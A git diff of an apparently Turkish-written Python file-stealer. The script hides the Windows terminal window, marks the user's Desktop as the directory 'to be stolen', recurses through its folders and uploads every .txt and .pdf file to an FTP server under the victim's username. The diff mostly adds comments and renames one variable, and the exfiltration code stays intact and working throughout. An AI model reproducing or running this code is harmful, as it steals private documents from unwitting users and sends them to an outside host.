@@ -23,10 +23,10 @@ def WindowsTerminaliGizle(): # Windows'da betiği çalıştırdıktan sonra term
     win32gui.ShowWindow(Terminal, 0)
 
 
-Kullanıcı_Dizini = os.getenv("USERPROFILE") # Kullanıcının bulunduğu dizini tanımladık
-print(Fore.MAGENTA + "\tİşte Sana Kullanıcı Dizini >> " + Kullanıcı_Dizini)
+Kullanici_Dizini = os.getenv("USERPROFILE") # Kullanıcının bulunduğu dizini tanımladık
+print(Fore.MAGENTA + "\tİşte Sana Kullanıcı Dizini >> " + Kullanici_Dizini)
 
-Calinacak_Dizin = Kullanıcı_Dizini + f"\\Desktop\\" # Kullanıcının masaüstünü tanımladık
+Calinacak_Dizin = Kullanici_Dizini + f"\\Desktop\\" # Kullanıcının masaüstünü tanımladık
 print(Fore.CYAN + "\n\tAma Ben Artık Burdayım;")
 print(Calinacak_Dizin)
 
@@ -51,22 +51,22 @@ def BulunanDizin(Gelen_Dizin): # BulunanDizin metodumuz ve alınan Gelen_Dizin v
     os.chdir(os.pardir)
 
 def KontrolEt(): # KontrolEt metodumuzu oluşturduk
-    Dosyalar = os.listdir(os.getcwd()) # os.getcwd() (current working directory) şuan çalışılan dizindeki dosyaları(os.listdir) tanımladık
-    for i in Dosyalar: # Dosyaları döngüye aldık
-        try:
+    Dosyalar = os.listdir(os.getcwd()) # os.getcwd() (current working directory) şuan çalışılan dizindeki dosyaları(os.listdir) kayıt ettik
+    for i in Dosyalar: # Kayıt edilen dosyalar for döngüsünde dökülür
+        try: # try olası hatalar için
             if re.match(".*txt", i): # Eğer txt ile biten dosya varsa
                 print(Fore.GREEN + "\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + i + "\n")
-                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb"))
+                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
             elif re.match(".*pdf", i): # Eğer pdf ile biten dosya varsa
-                print(Fore.GREEN + "\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + i + "\n")
-                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb"))
-            elif os.path.isdir(i): # i döngüsünde dosya yok ise
-                if Girilen_Dizinler.count(i) == 0: # Girilen_Dizinler listesini başa al
-                    BulunanDizin(i) # BulunanDizin metodunu i döngüsü ile başlat
-                else:
-                    pass # yoksay
-            else:
-                pass # yoksay
+                print(Fore.GREEN + "\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + i + "\n") 
+                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
+            elif os.path.isdir(i): # i döngüsünde dosya yok ise (dizin ise)
+                if Girilen_Dizinler.count(i) == 0: # Peki daha önce bu dizine girdik mi
+                    BulunanDizin(i) # Girmediysek BulunanDizin metodunu çağır
+                else: # Girilmişse
+                    pass # Pas geç, girme bir daha 
+            else: # Eğer eşleşen dosya yoksa
+                pass # Boşver
         except Exception as HATA: # Hata var ise
             print(Fore.RED + "\n\t[!] Bir hata ile karşılaşıldı! [!]\n") # Hata var
             print(HATA) # Tanımlanan hatayı ekrana yazdır
